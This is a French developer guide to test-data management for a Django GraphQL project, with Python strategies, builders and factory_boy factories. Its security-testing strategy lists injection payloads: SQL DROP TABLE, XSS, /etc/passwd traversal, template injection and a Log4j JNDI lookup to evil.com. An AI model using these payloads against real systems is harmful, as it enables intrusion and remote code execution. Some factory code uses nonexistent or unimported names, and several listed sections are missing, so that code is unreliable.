# Gestion des Données de Test - Django GraphQL Auto

Ce guide détaille les stratégies et bonnes pratiques pour la gestion des données de test dans le projet Django GraphQL Auto.

## 📋 Table des Matières

- [Vue d'Ensemble](#vue-densemble)
- [Stratégies de Données](#stratégies-de-données)
- [Fixtures Django](#fixtures-django)
- [Factory Pattern](#factory-pattern)
- [Gestion des Bases de Données](#gestion-des-bases-de-données)
- [Données de Test GraphQL](#données-de-test-graphql)
- [Nettoyage et Isolation](#nettoyage-et-isolation)
- [Performance et Optimisation](#performance-et-optimisation)
- [Bonnes Pratiques](#bonnes-pratiques)

## 🎯 Vue d'Ensemble

### Principes Fondamentaux

```python
# Principes de gestion des données de test
test_data_principles = {
    'isolation': 'Chaque test doit être indépendant',
    'repeatability': 'Les tests doivent être reproductibles',
    'minimalism': 'Utiliser le minimum de données nécessaires',
    'realism': 'Les données doivent être réalistes',
    'cleanup': 'Nettoyer après chaque test',
    'performance': 'Optimiser la création/destruction des données'
}
```

### Architecture des Données de Test

```
tests/
├── fixtures/
│   ├── __init__.py
│   ├── base_fixtures.py      # Fixtures de base
│   ├── user_fixtures.py      # Fixtures utilisateurs
│   ├── content_fixtures.py   # Fixtures de contenu
│   └── graphql_fixtures.py   # Fixtures GraphQL
├── factories/
│   ├── __init__.py
│   ├── base_factory.py       # Factory de base
│   ├── user_factory.py       # Factory utilisateurs
│   └── content_factory.py    # Factory de contenu
├── data/
│   ├── sample_data.json      # Données d'exemple
│   ├── test_schema.json      # Schémas de test
│   └── mock_responses.json   # Réponses mockées
└── utils/
    ├── data_builders.py      # Constructeurs de données
    ├── data_cleaners.py      # Nettoyeurs de données
    └── data_validators.py    # Validateurs de données
```

## 📊 Stratégies de Données

### 1. Stratégie par Type de Test

```python
# tests/strategies/data_strategy.py
"""Stratégies de données par type de test."""

from enum import Enum
from typing import Dict, Any, List
from dataclasses import dataclass


class TestDataStrategy(Enum):
    """Types de stratégies de données de test."""
    
    MINIMAL = "minimal"          # Données minimales
    REALISTIC = "realistic"      # Données réalistes
    EDGE_CASES = "edge_cases"    # Cas limites
    PERFORMANCE = "performance"  # Tests de performance
    SECURITY = "security"        # Tests de sécurité


@dataclass
class DataRequirement:
    """Exigences pour les données de test."""
    
    strategy: TestDataStrategy
    models: List[str]
    count: int
    relationships: bool = True
    cleanup: bool = True
    isolation: bool = True


class TestDataManager:
    """Gestionnaire des stratégies de données de test."""
    
    def __init__(self):
        self.strategies = {
            TestDataStrategy.MINIMAL: self._minimal_strategy,
            TestDataStrategy.REALISTIC: self._realistic_strategy,
            TestDataStrategy.EDGE_CASES: self._edge_cases_strategy,
            TestDataStrategy.PERFORMANCE: self._performance_strategy,
            TestDataStrategy.SECURITY: self._security_strategy,
        }
    
    def create_data(self, requirement: DataRequirement) -> Dict[str, Any]:
        """Crée les données selon la stratégie."""
        
        strategy_func = self.strategies.get(requirement.strategy)
        if not strategy_func:
            raise ValueError(f"Stratégie inconnue: {requirement.strategy}")
        
        return strategy_func(requirement)
    
    def _minimal_strategy(self, req: DataRequirement) -> Dict[str, Any]:
        """Stratégie de données minimales."""
        
        data = {}
        
        for model_name in req.models:
            if model_name == 'User':
                data['users'] = [
                    {
                        'username': 'testuser',
                        'email': 'test@example.com',
                        'first_name': 'Test',
                        'last_name': 'User'
                    }
                ]
            
            elif model_name == 'Author':
                data['authors'] = [
                    {
                        'first_name': 'John',
                        'last_name': 'Doe',
                        'email': 'john@example.com'
                    }
                ]
            
            elif model_name == 'Book':
                data['books'] = [
                    {
                        'title': 'Test Book',
                        'isbn': '1234567890123',
                        'publication_date': '2023-01-01'
                    }
                ]
        
        return data
    
    def _realistic_strategy(self, req: DataRequirement) -> Dict[str, Any]:
        """Stratégie de données réalistes."""
        
        from faker import Faker
        fake = Faker('fr_FR')
        
        data = {}
        
        for model_name in req.models:
            if model_name == 'User':
                data['users'] = [
                    {
                        'username': fake.user_name(),
                        'email': fake.email(),
                        'first_name': fake.first_name(),
                        'last_name': fake.last_name(),
                        'date_joined': fake.date_time_this_year(),
                    }
                    for _ in range(req.count)
                ]
            
            elif model_name == 'Author':
                data['authors'] = [
                    {
                        'first_name': fake.first_name(),
                        'last_name': fake.last_name(),
                        'email': fake.email(),
                        'bio': fake.text(max_nb_chars=500),
                        'birth_date': fake.date_of_birth(),
                    }
                    for _ in range(req.count)
                ]
            
            elif model_name == 'Book':
                data['books'] = [
                    {
                        'title': fake.sentence(nb_words=4)[:-1],  # Enlever le point
                        'isbn': fake.isbn13(),
                        'publication_date': fake.date_this_decade(),
                        'pages': fake.random_int(min=50, max=1000),
                        'description': fake.text(max_nb_chars=1000),
                    }
                    for _ in range(req.count)
                ]
        
        return data
    
    def _edge_cases_strategy(self, req: DataRequirement) -> Dict[str, Any]:
        """Stratégie pour les cas limites."""
        
        data = {}
        
        for model_name in req.models:
            if model_name == 'User':
                data['users'] = [
                    # Nom très long
                    {
                        'username': 'a' * 150,
                        'email': 'very-long-email-address@example.com',
                        'first_name': 'A' * 30,
                        'last_name': 'B' * 30,
                    },
                    # Caractères spéciaux
                    {
                        'username': 'user_with_special_chars_123',
                        'email': 'special+chars@example.com',
                        'first_name': 'Jean-François',
                        'last_name': "O'Connor",
                    },
                    # Valeurs minimales
                    {
                        'username': 'a',
                        'email': 'a@b.co',
                        'first_name': 'A',
                        'last_name': 'B',
                    }
                ]
            
            elif model_name == 'Book':
                data['books'] = [
                    # Titre très long
                    {
                        'title': 'A' * 200,
                        'isbn': '9999999999999',
                        'pages': 1,  # Minimum
                    },
                    # Titre très court
                    {
                        'title': 'A',
                        'isbn': '0000000000000',
                        'pages': 10000,  # Maximum
                    },
                    # Caractères Unicode
                    {
                        'title': '测试书籍 📚 Émile Zola',
                        'isbn': '1234567890123',
                        'pages': 500,
                    }
                ]
        
        return data
    
    def _performance_strategy(self, req: DataRequirement) -> Dict[str, Any]:
        """Stratégie pour les tests de performance."""
        
        # Générer beaucoup de données pour tester les performances
        data = {}
        
        for model_name in req.models:
            if model_name == 'Author':
                data['authors'] = [
                    {
                        'first_name': f'Author{i}',
                        'last_name': f'Lastname{i}',
                        'email': f'author{i}@example.com',
                    }
                    for i in range(req.count)
                ]
            
            elif model_name == 'Book':
                data['books'] = [
                    {
                        'title': f'Book Title {i}',
                        'isbn': f'{1000000000000 + i}',
                        'pages': 100 + (i % 900),
                    }
                    for i in range(req.count)
                ]
        
        return data
    
    def _security_strategy(self, req: DataRequirement) -> Dict[str, Any]:
        """Stratégie pour les tests de sécurité."""
        
        data = {}
        
        # Données avec tentatives d'injection
        security_payloads = [
            "'; DROP TABLE users; --",
            "<script>alert('XSS')</script>",
            "../../etc/passwd",
            "{{7*7}}",  # Template injection
            "${jndi:ldap://evil.com/a}",  # Log4j
        ]
        
        for model_name in req.models:
            if model_name == 'User':
                data['users'] = [
                    {
                        'username': payload[:30],  # Respecter les limites
                        'email': f'test{i}@example.com',
                        'first_name': payload[:30],
                        'last_name': 'Test',
                    }
                    for i, payload in enumerate(security_payloads)
                ]
            
            elif model_name == 'Book':
                data['books'] = [
                    {
                        'title': payload[:100],
                        'isbn': f'{1234567890000 + i}',
                        'description': payload,
                    }
                    for i, payload in enumerate(security_payloads)
                ]
        
        return data


# Utilisation
def create_test_data(strategy: TestDataStrategy, models: List[str], count: int = 1):
    """Fonction utilitaire pour créer des données de test."""
    
    manager = TestDataManager()
    requirement = DataRequirement(
        strategy=strategy,
        models=models,
        count=count
    )
    
    return manager.create_data(requirement)
```

### 2. Builder Pattern pour Données Complexes

```python
# tests/utils/data_builders.py
"""Constructeurs de données complexes."""

from typing import Dict, Any, Optional, List
from datetime import datetime, date


class DataBuilder:
    """Constructeur de base pour les données de test."""
    
    def __init__(self):
        self.data = {}
        self.relationships = {}
    
    def build(self) -> Dict[str, Any]:
        """Construit et retourne les données."""
        return {**self.data, **self.relationships}
    
    def reset(self):
        """Remet à zéro le constructeur."""
        self.data = {}
        self.relationships = {}
        return self


class UserBuilder(DataBuilder):
    """Constructeur pour les données utilisateur."""
    
    def with_username(self, username: str):
        """Définit le nom d'utilisateur."""
        self.data['username'] = username
        return self
    
    def with_email(self, email: str):
        """Définit l'email."""
        self.data['email'] = email
        return self
    
    def with_name(self, first_name: str, last_name: str):
        """Définit le nom complet."""
        self.data['first_name'] = first_name
        self.data['last_name'] = last_name
        return self
    
    def with_admin_privileges(self):
        """Donne les privilèges administrateur."""
        self.data['is_staff'] = True
        self.data['is_superuser'] = True
        return self
    
    def with_profile(self, **profile_data):
        """Ajoute des données de profil."""
        self.relationships['profile'] = profile_data
        return self
    
    def inactive(self):
        """Marque l'utilisateur comme inactif."""
        self.data['is_active'] = False
        return self


class AuthorBuilder(DataBuilder):
    """Constructeur pour les données d'auteur."""
    
    def with_name(self, first_name: str, last_name: str):
        """Définit le nom de l'auteur."""
        self.data['first_name'] = first_name
        self.data['last_name'] = last_name
        return self
    
    def with_email(self, email: str):
        """Définit l'email de l'auteur."""
        self.data['email'] = email
        return self
    
    def with_bio(self, bio: str):
        """Définit la biographie."""
        self.data['bio'] = bio
        return self
    
    def with_birth_date(self, birth_date: date):
        """Définit la date de naissance."""
        self.data['birth_date'] = birth_date
        return self
    
    def with_books(self, books: List[Dict[str, Any]]):
        """Ajoute des livres à l'auteur."""
        self.relationships['books'] = books
        return self
    
    def prolific(self, book_count: int = 10):
        """Crée un auteur prolifique avec plusieurs livres."""
        books = [
            {
                'title': f'Book {i+1}',
                'isbn': f'{1000000000000 + i}',
                'publication_date': date(2020 + i % 4, 1, 1)
            }
            for i in range(book_count)
        ]
        return self.with_books(books)


class BookBuilder(DataBuilder):
    """Constructeur pour les données de livre."""
    
    def with_title(self, title: str):
        """Définit le titre."""
        self.data['title'] = title
        return self
    
    def with_isbn(self, isbn: str):
        """Définit l'ISBN."""
        self.data['isbn'] = isbn
        return self
    
    def with_publication_date(self, pub_date: date):
        """Définit la date de publication."""
        self.data['publication_date'] = pub_date
        return self
    
    def with_pages(self, pages: int):
        """Définit le nombre de pages."""
        self.data['pages'] = pages
        return self
    
    def with_description(self, description: str):
        """Définit la description."""
        self.data['description'] = description
        return self
    
    def with_author(self, author_data: Dict[str, Any]):
        """Associe un auteur."""
        self.relationships['author'] = author_data
        return self
    
    def with_category(self, category_data: Dict[str, Any]):
        """Associe une catégorie."""
        self.relationships['category'] = category_data
        return self
    
    def bestseller(self):
        """Crée un bestseller."""
        self.data.update({
            'pages': 400,
            'description': 'Un bestseller international acclamé par la critique.',
            'rating': 4.8,
            'sales_count': 1000000
        })
        return self
    
    def classic(self):
        """Crée un classique."""
        self.data.update({
            'publication_date': date(1950, 1, 1),
            'pages': 300,
            'description': 'Un classique intemporel de la littérature.',
            'rating': 4.9
        })
        return self


class GraphQLTestDataBuilder:
    """Constructeur spécialisé pour les données de test GraphQL."""
    
    def __init__(self):
        self.schema_data = {}
        self.query_data = {}
        self.mutation_data = {}
    
    def with_authors_and_books(self, author_count: int = 3, books_per_author: int = 2):
        """Crée des auteurs avec leurs livres."""
        
        authors = []
        
        for i in range(author_count):
            author = (AuthorBuilder()
                     .with_name(f'Author{i+1}', f'Lastname{i+1}')
                     .with_email(f'author{i+1}@example.com')
                     .prolific(books_per_author)
                     .build())
            
            authors.append(author)
        
        self.schema_data['authors'] = authors
        return self
    
    def with_categories(self, categories: List[str]):
        """Crée des catégories."""
        
        category_data = [
            {
                'name': category,
                'description': f'Description pour {category}',
                'slug': category.lower().replace(' ', '-')
            }
            for category in categories
        ]
        
        self.schema_data['categories'] = category_data
        return self
    
    def with_complex_relationships(self):
        """Crée des relations complexes entre les entités."""
        
        # Auteurs
        authors = [
            (AuthorBuilder()
             .with_name('Victor', 'Hugo')
             .with_email('victor.hugo@example.com')
             .with_bio('Écrivain français du XIXe siècle')
             .build()),
            
            (AuthorBuilder()
             .with_name('Émile', 'Zola')
             .with_email('emile.zola@example.com')
             .with_bio('Romancier français, chef de file du naturalisme')
             .build())
        ]
        
        # Catégories
        categories = [
            {'name': 'Roman', 'description': 'Romans littéraires'},
            {'name': 'Classique', 'description': 'Littérature classique'},
            {'name': 'Historique', 'description': 'Romans historiques'}
        ]
        
        # Livres avec relations
        books = [
            (BookBuilder()
             .with_title('Les Misérables')
             .with_isbn('9782070409228')
             .with_publication_date(date(1862, 1, 1))
             .with_author(authors[0])
             .with_category(categories[0])
             .classic()
             .build()),
            
            (BookBuilder()
             .with_title('Germinal')
             .with_isbn('9782070360024')
             .with_publication_date(date(1885, 1, 1))
             .with_author(authors[1])
             .with_category(categories[1])
             .classic()
             .build())
        ]
        
        self.schema_data.update({
            'authors': authors,
            'categories': categories,
            'books': books
        })
        
        return self
    
    def build(self) -> Dict[str, Any]:
        """Construit les données complètes."""
        return {
            'schema': self.schema_data,
            'queries': self.query_data,
            'mutations': self.mutation_data
        }


# Fonctions utilitaires
def build_user(username: str = 'testuser') -> Dict[str, Any]:
    """Construit un utilisateur de test simple."""
    return (UserBuilder()
            .with_username(username)
            .with_email(f'{username}@example.com')
            .with_name('Test', 'User')
            .build())


def build_admin_user() -> Dict[str, Any]:
    """Construit un utilisateur administrateur."""
    return (UserBuilder()
            .with_username('admin')
            .with_email('admin@example.com')
            .with_name('Admin', 'User')
            .with_admin_privileges()
            .build())


def build_author_with_books(book_count: int = 3) -> Dict[str, Any]:
    """Construit un auteur avec ses livres."""
    return (AuthorBuilder()
            .with_name('John', 'Doe')
            .with_email('john.doe@example.com')
            .prolific(book_count)
            .build())


def build_complete_test_scenario() -> Dict[str, Any]:
    """Construit un scénario de test complet."""
    return (GraphQLTestDataBuilder()
            .with_authors_and_books(author_count=5, books_per_author=3)
            .with_categories(['Roman', 'Science-Fiction', 'Fantastique', 'Thriller'])
            .with_complex_relationships()
            .build())
```

## 🏭 Factory Pattern

### 1. Factory Boy Integration

```python
# tests/factories/base_factory.py
"""Factory de base pour les tests."""

import factory
from factory.django import DjangoModelFactory
from faker import Faker
from django.contrib.auth.models import User

fake = Faker('fr_FR')


class BaseFactory(DjangoModelFactory):
    """Factory de base avec fonctionnalités communes."""
    
    class Meta:
        abstract = True
    
    @classmethod
    def _create(cls, model_class, *args, **kwargs):
        """Création personnalisée avec logging."""
        instance = super()._create(model_class, *args, **kwargs)
        
        # Log pour debugging si nécessaire
        if hasattr(cls.Meta, 'debug') and cls.Meta.debug:
            print(f"Created {model_class.__name__}: {instance}")
        
        return instance


class UserFactory(BaseFactory):
    """Factory pour les utilisateurs."""
    
    class Meta:
        model = User
        django_get_or_create = ('username',)
    
    username = factory.Sequence(lambda n: f'user{n}')
    email = factory.LazyAttribute(lambda obj: f'{obj.username}@example.com')
    first_name = factory.Faker('first_name', locale='fr_FR')
    last_name = factory.Faker('last_name', locale='fr_FR')
    is_active = True
    is_staff = False
    is_superuser = False
    
    @factory.post_generation
    def password(self, create, extracted, **kwargs):
        """Définit le mot de passe après création."""
        if not create:
            return
        
        password = extracted or 'testpass123'
        self.set_password(password)
        self.save()


class AdminUserFactory(UserFactory):
    """Factory pour les utilisateurs administrateurs."""
    
    username = factory.Sequence(lambda n: f'admin{n}')
    is_staff = True
    is_superuser = True


class InactiveUserFactory(UserFactory):
    """Factory pour les utilisateurs inactifs."""
    
    username = factory.Sequence(lambda n: f'inactive{n}')
    is_active = False
```

### 2. Factories Spécialisées

```python
# tests/factories/content_factory.py
"""Factories pour le contenu."""

import factory
from factory.django import DjangoModelFactory
from datetime import date, datetime
from tests.models import TestAuthor, TestBook, TestCategory


class CategoryFactory(BaseFactory):
    """Factory pour les catégories."""
    
    class Meta:
        model = TestCategory
        django_get_or_create = ('name',)
    
    name = factory.Iterator([
        'Roman', 'Science-Fiction', 'Fantastique', 'Thriller',
        'Biographie', 'Histoire', 'Philosophie', 'Poésie'
    ])
    description = factory.LazyAttribute(
        lambda obj: f'Description pour la catégorie {obj.name}'
    )
    slug = factory.LazyAttribute(
        lambda obj: obj.name.lower().replace(' ', '-').replace('-', '_')
    )


class AuthorFactory(BaseFactory):
    """Factory pour les auteurs."""
    
    class Meta:
        model = TestAuthor
        django_get_or_create = ('email',)
    
    first_name = factory.Faker('first_name', locale='fr_FR')
    last_name = factory.Faker('last_name', locale='fr_FR')
    email = factory.LazyAttribute(
        lambda obj: f'{obj.first_name.lower()}.{obj.last_name.lower()}@example.com'
    )
    bio = factory.Faker('text', max_nb_chars=500, locale='fr_FR')
    birth_date = factory.Faker('date_of_birth', minimum_age=25, maximum_age=80)
    
    @factory.post_generation
    def books(self, create, extracted, **kwargs):
        """Crée des livres pour l'auteur."""
        if not create:
            return
        
        if extracted:
            # Si des livres sont fournis explicitement
            for book_data in extracted:
                BookFactory.create(author=self, **book_data)
        else:
            # Créer quelques livres par défaut
            BookFactory.create_batch(2, author=self)


class BookFactory(BaseFactory):
    """Factory pour les livres."""
    
    class Meta:
        model = TestBook
        django_get_or_create = ('isbn',)
    
    title = factory.Faker('sentence', nb_words=4, locale='fr_FR')
    isbn = factory.Faker('isbn13')
    publication_date = factory.Faker('date_between', start_date='-50y', end_date='today')
    pages = factory.Faker('random_int', min=50, max=1000)
    description = factory.Faker('text', max_nb_chars=1000, locale='fr_FR')
    
    # Relations
    author = factory.SubFactory(AuthorFactory)
    category = factory.SubFactory(CategoryFactory)
    
    @factory.lazy_attribute
    def title(self):
        """Génère un titre sans point final."""
        title = fake.sentence(nb_words=4)
        return title[:-1] if title.endswith('.') else title


class BestsellerBookFactory(BookFactory):
    """Factory pour les bestsellers."""
    
    pages = factory.Faker('random_int', min=300, max=600)
    description = factory.LazyAttribute(
        lambda obj: f"Un bestseller captivant: {obj.title}. "
                   f"Ce livre a conquis des millions de lecteurs à travers le monde."
    )
    
    @factory.post_generation
    def bestseller_attributes(self, create, extracted, **kwargs):
        """Ajoute des attributs de bestseller."""
        if create:
            # Simuler des ventes élevées, des critiques positives, etc.
            pass


class ClassicBookFactory(BookFactory):
    """Factory pour les livres classiques."""
    
    publication_date = factory.Faker('date_between', start_date='-100y', end_date='-20y')
    pages = factory.Faker('random_int', min=200, max=800)
    description = factory.LazyAttribute(
        lambda obj: f"Un classique intemporel: {obj.title}. "
                   f"Cette œuvre a marqué l'histoire de la littérature."
    )


class RecentBookFactory(BookFactory):
    """Factory pour les livres récents."""
    
    publication_date = factory.Faker('date_between', start_date='-2y', end_date='today')
    pages = factory.Faker('random_int', min=150, max=400)


# Traits pour personnaliser les factories
class AuthorTraits:
    """Traits pour personnaliser les auteurs."""
    
    @staticmethod
    def prolific():
        """Auteur prolifique avec beaucoup de livres."""
        return factory.Trait(
            books=factory.RelatedFactoryBoy(BookFactory, 'author', size=10)
        )
    
    @staticmethod
    def french():
        """Auteur français."""
        return factory.Trait(
            first_name=factory.Faker('first_name', locale='fr_FR'),
            last_name=factory.Faker('last_name', locale='fr_FR'),
            bio=factory.LazyAttribute(
                lambda obj: f"Écrivain français né en {obj.birth_date.year}."
            )
        )
    
    @staticmethod
    def contemporary():
        """Auteur contemporain."""
        return factory.Trait(
            birth_date=factory.Faker('date_between', start_date='-60y', end_date='-25y')
        )


# Factory avec traits
class FrenchAuthorFactory(AuthorFactory):
    """Factory pour auteur français."""
    
    class Meta:
        model = TestAuthor
    
    first_name = factory.Faker('first_name', locale='fr_FR')
    last_name = factory.Faker('last_name', locale='fr_FR')
    bio = factory.LazyAttribute(
        lambda obj: f"Écrivain français, {obj.first_name} {obj.last_name} "
                   f"est né en {obj.birth_date.year}."
    )


class ProlificAuthorFactory(AuthorFactory):
    """Factory pour auteur prolifique."""
    
    @factory.post_generation
    def books(self, create, extracted, **kwargs):
        """Crée beaucoup de livres."""
        if create:
            BookFactory.create_batch(15, author=self)
```

### 3. Factory Utilities

```python
# tests/factories/utils.py
"""Utilitaires pour les factories."""

from typing import List, Dict, Any, Type
from factory.django import DjangoModelFactory
import random


class FactoryManager:
    """Gestionnaire pour les factories."""
    
    def __init__(self):
        self.factories = {}
        self.created_objects = []
    
    def register_factory(self, name: str, factory_class: Type[DjangoModelFactory]):
        """Enregistre une factory."""
        self.factories[name] = factory_class
    
    def create(self, factory_name: str, **kwargs) -> Any:
        """Crée un objet avec la factory spécifiée."""
        
        if factory_name not in self.factories:
            raise ValueError(f"Factory '{factory_name}' non trouvée")
        
        factory_class = self.factories[factory_name]
        obj = factory_class.create(**kwargs)
        
        self.created_objects.append(obj)
        return obj
    
    def create_batch(self, factory_name: str, size: int, **kwargs) -> List[Any]:
        """Crée plusieurs objets."""
        
        if factory_name not in self.factories:
            raise ValueError(f"Factory '{factory_name}' non trouvée")
        
        factory_class = self.factories[factory_name]
        objects = factory_class.create_batch(size, **kwargs)
        
        self.created_objects.extend(objects)
        return objects
    
    def cleanup(self):
        """Nettoie tous les objets créés."""
        
        for obj in reversed(self.created_objects):
            try:
                obj.delete()
            except Exception as e:
                print(f"Erreur lors de la suppression de {obj}: {e}")
        
        self.created_objects.clear()


class DataSetBuilder:
    """Constructeur de jeux de données complexes."""
    
    def __init__(self):
        self.data_sets = {}
    
    def create_library_dataset(self, 
                              authors_count: int = 10,
                              books_per_author: int = 3,
                              categories_count: int = 5) -> Dict[str, List[Any]]:
        """Crée un jeu de données pour une bibliothèque."""
        
        # Créer les catégories
        categories = CategoryFactory.create_batch(categories_count)
        
        # Créer les auteurs avec leurs livres
        authors = []
        books = []
        
        for _ in range(authors_count):
            author = AuthorFactory.create()
            authors.append(author)
            
            # Créer des livres pour cet auteur
            author_books = BookFactory.create_batch(
                books_per_author,
                author=author,
                category=factory.Iterator(categories)
            )
            books.extend(author_books)
        
        dataset = {
            'authors': authors,
            'books': books,
            'categories': categories
        }
        
        self.data_sets['library'] = dataset
        return dataset
    
    def create_performance_dataset(self, scale: str = 'medium') -> Dict[str, List[Any]]:
        """Crée un jeu de données pour les tests de performance."""
        
        scales = {
            'small': {'authors': 50, 'books_per_author': 2, 'categories': 5},
            'medium': {'authors': 200, 'books_per_author': 5, 'categories': 10},
            'large': {'authors': 1000, 'books_per_author': 10, 'categories': 20},
        }
        
        config = scales.get(scale, scales['medium'])
        
        return self.create_library_dataset(
            authors_count=config['authors'],
            books_per_author=config['books_per_author'],
            categories_count=config['categories']
        )
    
    def create_edge_cases_dataset(self) -> Dict[str, List[Any]]:
        """Crée un jeu de données avec des cas limites."""
        
        # Auteur sans livres
        author_no_books = AuthorFactory.create(
            first_name='A',
            last_name='B',
            email='a@b.co'
        )
        
        # Auteur avec beaucoup de livres
        prolific_author = AuthorFactory.create(
            first_name='Prolific',
            last_name='Writer'
        )
        many_books = BookFactory.create_batch(50, author=prolific_author)
        
        # Livre avec titre très long
        long_title_book = BookFactory.create(
            title='A' * 200,
            pages=1
        )
        
        # Livre avec caractères spéciaux
        special_chars_book = BookFactory.create(
            title='Livre avec émojis 📚 et caractères spéciaux ñáéíóú',
            description='Description avec <script>alert("XSS")</script>'
        )
        
        return {
            'edge_case_authors': [author_no_books, prolific_author],
            'edge_case_books': [long_title_book, special_chars_book] + many_books,
            'categories': CategoryFactory.create_batch(3)
        }


# Fonctions utilitaires globales
def create_test_library(size: str = 'small') -> Dict[str, List[Any]]:
    """Crée une bibliothèque de test."""
    builder = DataSetBuilder()
    return builder.create_performance_dataset(scale=size)


def create_random_books(count: int = 10) -> List[Any]:
    """Crée des livres aléaoires."""
    categories = CategoryFactory.create_batch(5)
    authors = AuthorFactory.create_batch(count // 2)
    
    books = []
    for _ in range(count):
        book = BookFactory.create(
            author=random.choice(authors),
            category=random.choice(categories)
        )
        books.append(book)
    
    return books


def create_author_with_bestsellers(bestseller_count: int = 3) -> Any:
    """Crée un auteur avec des bestsellers."""
    author = AuthorFactory.create()
    
    bestsellers = BestsellerBookFactory.create_batch(
        bestseller_count,
        author=author
    )
    
    return author, bestsellers
```

Ce guide de gestion des données de test fournit une base solide pour créer, organiser et maintenir des données de test efficaces et maintenables pour le projet Django GraphQL Auto.